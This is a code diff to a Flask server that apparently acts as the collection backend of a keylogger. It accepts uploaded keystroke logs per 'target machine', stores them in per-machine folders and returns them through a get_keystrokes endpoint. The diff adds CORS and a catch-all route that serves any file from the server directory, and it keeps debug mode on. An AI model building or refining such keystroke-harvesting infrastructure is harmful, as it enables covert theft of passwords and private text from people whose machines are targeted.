@@ -1,4 +1,5 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_from_directory
+from flask_cors import CORS
 import time
 import os
 
@@ -6,6 +7,7 @@ DATA_FOLDER = "data"
 LOG_INTERVAL = 5 * 60 
 
 app = Flask(__name__)
+CORS(app) 
 
 last_log_info = {}  # {machine: {"time": <timestamp>, "file": <path>} }
 
@@ -17,7 +19,7 @@ def upload():
     data = request.get_json()
     if not data or "machine" not in data or "data" not in data:
         return jsonify({"error": "Invalid payload"}), 400
-    
+
     machine = data["machine"]
     log_data = data["data"]
 
@@ -33,7 +35,6 @@ def upload():
         file_path = os.path.join(machine_folder, filename)
         with open(file_path, "w", encoding="utf-8") as f:
             f.write(log_data + "\n")
-
         last_log_info[machine] = {"time": now, "file": file_path}
         return jsonify({"status": "new_file", "file": file_path}), 200
     else:
@@ -57,7 +58,7 @@ def get_target_machines_list():
 
 
 @app.route('/api/get_keystrokes/<machine>', methods=['GET'])
-def get_target_machine_key_strokes(machine):
+def get_keystrokes(machine):
     machine_folder = os.path.join(DATA_FOLDER, machine)
     if not os.path.exists(machine_folder):
         return jsonify({"error": "Machine folder not found"}), 404
@@ -68,11 +69,20 @@ def get_target_machine_key_strokes(machine):
         if os.path.isfile(os.path.join(machine_folder, f)) and f.startswith("log_")
     ]
     log_files.sort()
+
     keystrokes = []
     for file_path in log_files:
         with open(file_path, "r", encoding="utf-8") as f:
             keystrokes.append(f.read())
-    return jsonify({"machine": machine, "keystrokes": keystrokes}), 200
+    return jsonify({"machine": machine, "keystrokes": keystrokes})
+
+@app.route('/')
+def index():
+    return send_from_directory('.', 'index.html')
+
+@app.route('/<path:path>')
+def static_files(path):
+    return send_from_directory('.', path)
 
 if __name__ == "__main__":
-    app.run(debug=True, host='0.0.0.0')
+    app.run(debug=True)
